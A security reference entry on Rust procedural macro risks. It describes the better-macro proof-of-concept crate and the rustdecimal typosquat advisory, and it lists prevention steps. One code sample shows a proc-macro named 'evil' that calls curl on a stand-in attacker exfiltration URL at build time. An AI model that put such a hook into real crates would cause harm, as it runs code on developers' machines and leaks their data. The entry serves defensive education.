---
source: "languages/rust/proc-macro-security.md"
title: "🦀 Rust Procedural Macro Security"
category: "language-vuln"
language: "rust"
severity: "high"
tags: [cve-2021-38196, language-vuln, prevention, rust, rustdecimal, rustsec-2021-0077, rustsec-2022-0042, what]
---

# 🦀 Rust Procedural Macro Security
> **Severity:** High

## What Is It?
Proc-macros are Rust code that runs at compile time. They process token streams and generate new code. An untrusted crate's proc-macro **can do anything at compile time** (file read/write, network, RCE).

## CVE-2021-38196 / RUSTSEC-2021-0077 — better-macro deliberate compile-time RCE
`better-macro` is a proof-of-concept crate published specifically to prove the point that a procedural macro runs arbitrary code at compile time with the same file/network/process access as the compiler itself. Its `better_macro::println` macro executes attacker-chosen code (it opens a URL; nothing stops that payload from being malicious) the moment a project that depends on it is *built* — no runtime, no execution of the final binary required. It has no legitimate functionality and should never be used; it exists as a live demonstration of the proc-macro / build-script threat model.

```rust
// VULNERABLE pattern the PoC illustrates — a proc-macro that runs code at BUILD time:
#[proc_macro]
pub fn evil(_input: TokenStream) -> TokenStream {
    // Runs during `cargo build`, before any of YOUR code executes:
    std::process::Command::new("curl").arg("https://attacker/exfil").status().ok();
    // ...then returns whatever tokens it likes.
    TokenStream::new()
}
```

## RUSTSEC-2022-0042 — rustdecimal malicious typosquat
Not a proc-macro itself, but the same compile-/build-time code-execution threat model: `rustdecimal` typosquatted the popular `rust_decimal` crate and shipped malware that ran arbitrary code when `Decimal::new` was called (it checked for a `GITLAB_CI` env var). It shows why the *identity and trust* of any crate that runs during your build — proc-macro or build script — matters as much as its code.

## Prevention
- Don't use untrusted proc-macro crates
- Audit proc-macro crates through code review
- Check whether proc-macros generate unsafe code
- Whitelist proc-macro crates with `cargo deny`

**Source:** CVE-2021-38196 / RUSTSEC-2021-0077, RUSTSEC-2022-0042
